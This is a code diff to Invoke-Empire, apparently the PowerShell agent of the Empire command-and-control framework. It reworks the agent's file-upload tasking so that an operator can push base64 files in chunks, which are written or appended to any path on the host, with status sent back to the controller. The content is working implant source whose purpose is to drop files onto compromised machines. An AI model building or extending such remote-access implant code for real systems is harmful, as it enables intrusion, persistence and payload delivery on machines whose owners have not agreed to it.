@@ -827,20 +827,32 @@ function Invoke-Empire {
                     $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
-            # file upload
+            # file upload (supports chunked: "index|total|path|data" or legacy: "path|data")
             elseif($type -eq 42) {
-                $parts = $data.split('|');
-                $filename = $parts[0];
-                $base64part = $parts[1];
-                # get the raw file contents and save it to the specified location
-                $Content = [System.Convert]::FromBase64String($base64part);
+                $parts = $data.split('|', 4);
+                if (($parts.Count -eq 4) -and ($parts[0] -match '^\d+$')) {
+                    $chunkIndex = [int]$parts[0];
+                    $totalChunks = [int]$parts[1];
+                    $filename = $parts[2];
+                    $base64part = $parts[3];
+                } else {
+                    $chunkIndex = 0;
+                    $totalChunks = 1;
+                    $filename = $parts[0];
+                    $base64part = $parts[1];
+                }
                 try{
-                    Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
-                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
+                    $Content = [System.Convert]::FromBase64String($base64part);
+                    if ($chunkIndex -eq 0) {
+                        Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop
+                    } else {
+                        Add-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop
+                    }
+                    Encode-Packet -type $type -data "[*] Upload of $fileName successful (chunk $($chunkIndex+1)/$totalChunks)" -ResultID $ResultID;
                     $script:tasks[$ResultID]['status'] = 'completed'
                 }
                 catch {
-                    Encode-Packet -type 0 -data $error -ResultID $ResultID;
+                    Encode-Packet -type 0 -data "[!] Error uploading $fileName (chunk $($chunkIndex+1)/$totalChunks): $($_.Exception.Message)" -ResultID $ResultID;
                     $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
